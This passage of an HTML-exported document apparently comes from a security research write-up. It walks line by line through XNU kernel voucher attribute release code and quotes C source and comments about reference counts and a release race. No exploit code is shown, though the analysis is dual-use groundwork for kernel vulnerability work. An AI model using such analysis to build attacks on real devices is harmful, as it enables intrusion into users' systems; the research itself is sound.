class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;First they grab references to the attribute manager and controller for the given key index (&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;), take the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock then take calculate a pointer into the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get a pointer to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;corresponding to the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;to be released.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;If this entry is marked as persistent, then nothing happens, otherwise the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is decremented. If the reference count is still non-zero, they drop the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and return. Otherwise, the reference count of this &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;has gone to zero and they will continue on to &amp;quot;free&amp;quot; the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span&gt;. As noted before, this isn&amp;#39;t going to free the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;to the zone allocator; the entry is just an entry in an array and in its free state its index is present in a freelist of empty indexes. The code continues thus:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3548b2c452dd7eb3579b0290670f339199044845&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.43&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_index_to_key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* if last return reply is still pending,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* let it handle this later return when&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the previous reply comes in.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* claim releasing */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_releasing &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_index_to_key&lt;/span&gt;&lt;span&gt;&amp;nbsp;goes back from the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the key value (which in practice will be 1 greater than the key index.) Then the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_entry&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;is marked as &amp;quot;releasing&amp;quot;. The code continues:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.2d8847df4f2d48c8c26863add2566524e8dbcae8&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.44&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;redrive&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_release_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_made &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
